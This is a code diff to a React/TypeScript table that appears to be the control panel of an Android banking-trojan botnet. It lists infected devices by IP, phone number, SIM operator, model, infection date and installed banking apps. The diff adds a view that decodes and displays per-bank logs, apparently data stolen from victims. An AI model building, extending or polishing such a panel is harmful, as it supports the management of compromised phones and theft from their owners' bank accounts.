@@ -21,10 +21,20 @@ import {
   EyeInvisibleOutlined,
   InfoCircleOutlined,
   SettingOutlined,
-  MessageOutlined
+  UserSwitchOutlined,
+  FlagOutlined,
+  FieldTimeOutlined,
+  TagsOutlined,
+  AndroidOutlined,
+  MessageOutlined,
+  CommentOutlined,
+  CalendarOutlined
+  
 } from '@ant-design/icons';
 import CommentModal from './CommentModal';
 import { AppContext } from '../../providers';
+import { Base64 } from 'js-base64';
+import BotBankInfo from './BotBankInfo';
 
 const { Option } = Select
 
@@ -215,6 +225,14 @@ const BotsTable: React.FC = () => {
     })
   }
 
+  const getBankInfo = (logs: any, app: string) => {
+    setState((state: BotStateType) => ({
+      ...state,
+      botBankInfoModal: true,
+      botBankInfoLogs: logs.filter((row: any) => row.application === app).map((row: any) => (changeResponseToClient({ ...row, logs: JSON.parse(Base64.decode(row.logs)) }))),
+    }))
+  }
+
   const handleInfo = (botId: string) => {
     setState((state: BotStateType) => {
       return {
@@ -263,7 +281,10 @@ const BotsTable: React.FC = () => {
       }
     },
     {
-      title: 'Bot',
+      // title: 'Bot',
+      title: () => { 
+        return <UserSwitchOutlined className='!text-lg !text-orange-500' />;
+      },
       dataIndex: 'id',
       render: (botId: string, record: BotRowType) => {
         return (
@@ -277,7 +298,10 @@ const BotsTable: React.FC = () => {
       }
     },
     {
-      title: 'IP',
+      // title: 'IP',
+      title: () => {
+        return <FlagOutlined className='!text-lg !text-orange-500' />;
+      },
       dataIndex: 'ip',
       render: (ip: string, record: BotRowType) => {
         return (
@@ -291,11 +315,15 @@ const BotsTable: React.FC = () => {
       }
     },
     {
-      title: 'Tag',
+      // title: 'Tag',
+      title: () => {
+        return <TagsOutlined  className='!text-lg !text-orange-500'/>
+      },
       dataIndex: 'tag',
     },
     {
-      title: 'Time',
+      // title: 'Time',
+      title: () => <FieldTimeOutlined  className='!text-lg !text-orange-500'/>,
       dataIndex: 'lastConnect',
       render: (lastConnect: string) => {
 
@@ -319,7 +347,8 @@ const BotsTable: React.FC = () => {
       }
     },
     {
-      title: 'Android',
+      // title: 'Android',
+      title: () => <AndroidOutlined  className='!text-lg !text-orange-500'/>,
       dataIndex: 'version',
       render: (version: string) => {
 
@@ -329,20 +358,33 @@ const BotsTable: React.FC = () => {
       }
     },
     {
-      title: 'Bank',
+      // title: 'Bank',
+      title: () => <BankOutlined  className='!text-lg !text-orange-500'/> ,
       dataIndex: 'banks',
       render: (banks: string, record: any) => {
         let content = []
-        if (banks != '') {
+        if (banks !== '') {
           content = banks.split(':')
           return (
             <>
               {content.map((item, i) => {
                 return (
                   <div className='flex'>
-                    <BankOutlined className='mt-1' />
+                    {
+                      record.logs.some((row: any) => row.application === item) > 0 ? (
+                        <BankOutlined className='mt-1 !text-green-500' />
+                      ) : (
+                        <BankOutlined className='mt-1' />
+                      )
+                    }
                     &nbsp;<img src={`data:image/gif;base64,${record.icons[i]}`} className='w-4 h-4 mt-1' />
-                    <div className=''>&nbsp;{item}</div>
+                    {
+                      record.logs.some((row: any) => row.application === item) > 0 ? (
+                        <div className='cursor-pointer text-green-500' onClick={() => { getBankInfo(record.logs, item) }}>&nbsp;{item}</div>
+                      ) : (
+                        <div>&nbsp;{item}</div>
+                      )
+                    }
                   </div>
                 )
               })}
@@ -357,21 +399,29 @@ const BotsTable: React.FC = () => {
       }
     },
     {
-      title: 'Sim',
+      // title: 'Sim',
+      title: () => <SettingOutlined className='!text-lg !text-orange-500'/> ,
       dataIndex: 'operator',
-    },
-    {
-      title: 'DateTime',
-      dataIndex: 'dateInfection',
-      render: (date: string) => {
-        const dates = new Date(date).toLocaleString().split(',')
+      render: (operator: string, record: BotRowType) => {
         return (
-          <div className='text-center'>{dates[0].trim()}<br/>{dates[1].trim()}</div>
+          <div className='text-center'>{operator}<br />{record.phoneNumber}<br/>{record.model}</div>
         )
       }
     },
     {
-      title: 'Comment',
+      // title: 'DateTime',
+      title: () => <CalendarOutlined  className='!text-lg !text-orange-500'/> ,
+      dataIndex: 'dateInfection',
+      render: (date: string) => {
+        const dates = new Date(date).toLocaleString().split(',')
+        return (
+          <div className='text-center'>{dates[0].trim()}<br />{dates[1].trim()}</div>
+        )
+      }
+    },
+    {
+      // title: 'Comment',
+      title: () => <CommentOutlined  className='!text-lg !text-orange-500'/> ,
       dataIndex: 'comment',
       render: (comment: string, record: BotRowType) => {
         return (<div className='w-full h-6 cursor-pointer text-stone-400 hover:text-stone-200 duration-300' onClick={() => { commentChange(comment, record.id) }}>{comment.length > 10 ? comment.substring(0, 10) + '...' : comment}</div>)
@@ -425,6 +475,7 @@ const BotsTable: React.FC = () => {
         <Table rowSelection={rowSelection} columns={columns} dataSource={state.table.rows} pagination={false} />
       </Spin>
       <CommentModal />
+      <BotBankInfo />
       <Pagination className='float-right !pt-2' defaultCurrent={state.table.page} total={state.table.count} pageSize={state.table.perPage} onChange={(page: number) => setState((state: BotStateType) => ({ ...state, table: { ...state.table, page: page } }))} />
     </>
 
